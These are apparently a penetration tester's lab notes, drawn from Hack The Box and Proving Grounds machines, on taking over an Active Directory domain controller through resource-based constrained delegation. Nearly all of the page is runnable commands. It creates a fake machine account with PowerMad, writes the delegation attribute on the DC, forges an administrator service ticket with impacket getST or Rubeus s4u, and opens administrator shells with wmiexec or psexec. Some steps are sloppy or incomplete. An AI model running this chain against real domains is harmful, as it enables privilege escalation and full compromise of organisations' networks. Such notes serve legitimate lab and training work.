# Resource Based Constraint Delegation
------------------

Refer - HTB Support by 0xdf

### How to find it?
Using bloodhound 
(Generic All permission)
### How to exploit it?
Import PowerView and PowerMad
Check permissions to create a new computer object on the domain:
```
Get-DomainObject -Identity "dc=support,dc=htb" -Domain support.htb
```
Check out the property `ms-ds-machineaccountquota`  -> usually 10

Check if the DC is running at least Windows 2012:
```
Get-DomainController
```

Check if the target computer `dc` has the attribute `msds-allowedtoactonbehalfofotheridentity`  not set:
```
Get-NetComputer dc | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

Creating a new Computer Object:
After importing PowerMad
```
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

Get the SID of the computer:
```
Get-DomainComputer fake01
```

Create new security descriptor for fake01 computer:
```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```
**Change the SID**

Apply the security descriptor bytes to the target dc machine:
```
Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

Using impacket getST python script to get a ticket for the service www as the user administrator:
```bash
python3 /opt/impacket/examples/getST.py support.htb/fake01:123456 -dc-ip 10.129.168.220 -impersonate administrator -spn www/dc.support.htb
```
The ticket will be saved to a CCache file.
https://wadcoms.github.io/wadcoms/Impacket-getST-Creds/

To use the ticket with other impacket scripts export the ticket:
```bash
export KRB5CCNAME=administrator.cache
```

Using wmiexec to get a shell as the administrator:
```bash
python3 /opt/impacket/examples/wmiexec.py
support.htb/administrator@dc.support.htb -no-pass -k
```


-----------


There is another way to do this using Rebeus!

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
https://decoder.cloud/2019/03/20/donkeys-guide-to-resource-based-constrained-delegation-from-standard-user-to-da/
https://www.onsecurity.io/blog/abusing-kerberos-from-linux/
http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html

------------------

## Using StandIn & Rubeus

PGP - Resourced

- Create a new computer account using StandIn
```
.\StandIn.exe --computer cbbn --make
```
note down the password.
- Get the SID of the machine we just created.
- Set msds allowed to bnlah blah
```
.\standin.exe --computer ResourceDC --sid SID
```

- Use Rubeus to impersonate the Administrator on the machine to get the ticket
- Rubeus requires the RC4 hash of the password:
```python
import hashlib,binascii
hash = hashlib.new('md4', "passw0rd123".encode('utf-16le')).digest()
print(binascii.hexlify(hash))
```

```
.\Rubeus.exe s4u /user:cbbn /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local nowrap /ptt
```
- Now the ticket is successfully imported.
- Copy over the ticket locally and crack it to use it locally 
- Decode the base64 ticket to `.kirbi`
- Convert it to a ccache file using impacket:
```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```

```bash
export KRB5CCNAME=ticket.ccache
```

- Use psexec to log in as administrator
```bash
psexec -k -no-pass 
```

-----------
